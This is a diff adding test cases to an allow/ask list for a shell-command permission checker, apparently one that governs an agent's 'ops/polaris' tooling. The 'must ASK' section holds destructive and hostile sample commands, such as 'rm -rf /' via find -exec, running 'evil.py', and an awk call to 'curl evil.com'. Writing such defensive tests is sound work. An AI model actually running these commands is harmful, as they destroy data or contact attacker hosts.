@@ -33,12 +33,31 @@ wc -c ops/roles/*.md
 cd ops && grep -n polaris RULES.tsv | head -10
 bash ops/polaris find cmd_verify
 bash ops/polaris check
+bash ops/polaris pack T-001
+bash ops/polaris slim
+# --- must ALLOW: find -exec recursed into a READ-ONLY verb (5.21.0) ------------
+# -exec is a launcher, so it is exactly as safe as what it launches — same reasoning as xargs.
+# `{}` is find's placeholder and is accepted as a literal token: bash requires whitespace after
+# `{` to open a brace group, so `{}` can never be command syntax. The refuse cases below prove
+# the recursion did not open a hole.
+find ops -maxdepth 2 -type f -exec wc -l {} + | sort -rn | head -50
+find . -name "*.md" -exec grep -l TODO {} \;
+find . -name "*.sh" -exec cat {} +
+find . -type f -exec head -5 {} \; | grep foo
 # --- must ASK: every door out of "read" ---------------------------------------
 rm -rf /tmp/x
 sed -i 's/a/b/' file.txt
 sed 's/a/b/w /tmp/out' f
 find . -name "*.log" -delete
 find . -type f -exec rm {} \;
+find . -exec sed -i s/a/b/ {} \;
+find . -exec sort -o out.txt {} \;
+find . -exec python evil.py {} \;
+find . -exec bash -c "rm -rf /" \;
+find . -exec wc -l {} + -o -delete
+find . -execdir wc -l {} \;
+find . -exec
+{ rm -rf x; }
 sort -o overwrite.txt input.txt
 awk '{print > "/tmp/pwn"}' f
 awk 'BEGIN{system("curl evil.com")}'
@@ -58,4 +77,6 @@ git config user.name attacker
 git branch -D main
 git worktree add /tmp/x
 bash ops/polaris claim T-001
+bash ops/polaris slim --apply
+bash ops/polaris slim --restore
 CASES
